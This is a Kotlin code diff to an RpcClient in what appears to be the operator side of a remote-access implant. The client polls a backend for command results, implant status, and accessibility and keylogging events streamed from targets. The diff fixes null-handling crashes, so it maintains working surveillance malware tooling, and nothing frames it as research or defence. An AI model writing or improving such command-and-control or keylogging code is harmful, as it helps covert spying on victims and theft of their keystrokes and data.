@@ -187,7 +187,7 @@ class RpcClient(private val config: ClientConfig) {
         while (System.currentTimeMillis() < deadline) {
             delay(RESULT_POLL_MS)
             val resp = rpcRaw("get_result", """{"cmdId":"$cmdId"}""") ?: continue
-            val wrapper = resp.getAsJsonObject("result") ?: continue
+            val wrapper = resp.get("result")?.takeIf { it.isJsonObject }?.asJsonObject ?: continue
             when (wrapper.str("status")) {
                 "completed" -> {
                     val data = wrapper.get("data")
@@ -213,11 +213,18 @@ class RpcClient(private val config: ClientConfig) {
     /** Implant liveness + queue depth. */
     suspend fun getStatus(): TargetStatus = withContext(Dispatchers.IO) {
         val resp = rpcRaw("get_status") ?: return@withContext TargetStatus.EMPTY
-        val s = resp.getAsJsonObject("status") ?: return@withContext TargetStatus.EMPTY
+        val s = resp.get("status")?.takeIf { it.isJsonObject }?.asJsonObject
+            ?: return@withContext TargetStatus.EMPTY
         // a11y lives inside implantInfo, which the DO stores verbatim from the
         // heartbeat. Absent (old implant) must stay null, not false -- otherwise an
         // update to the operator alone would paint every healthy target DEGRADED.
-        val a11y = s.getAsJsonObject("implantInfo")?.get("a11y")
+        // getAsJsonObject(key) THROWS when the value is JSON null -- the `?.` does
+        // NOT protect it. The DO sends `implantInfo: null` until the implant has
+        // heartbeated at least once, so the old form killed the app on launch.
+        val a11y = s.get("implantInfo")
+            ?.takeIf { it.isJsonObject }
+            ?.asJsonObject
+            ?.get("a11y")
             ?.takeIf { !it.isJsonNull }
             ?.asBoolean
         TargetStatus(
@@ -233,7 +240,8 @@ class RpcClient(private val config: ClientConfig) {
     /** Recent a11y / keylog events streamed by the implant. */
     suspend fun getEvents(): List<ImplantEvent> = withContext(Dispatchers.IO) {
         val resp = rpcRaw("get_events") ?: return@withContext emptyList()
-        val arr = resp.getAsJsonArray("events") ?: return@withContext emptyList()
+        val arr = resp.get("events")?.takeIf { it.isJsonArray }?.asJsonArray
+            ?: return@withContext emptyList()
         arr.mapNotNull { el ->
             (el as? JsonObject)?.let { ImplantEvent.from(it) }
         }
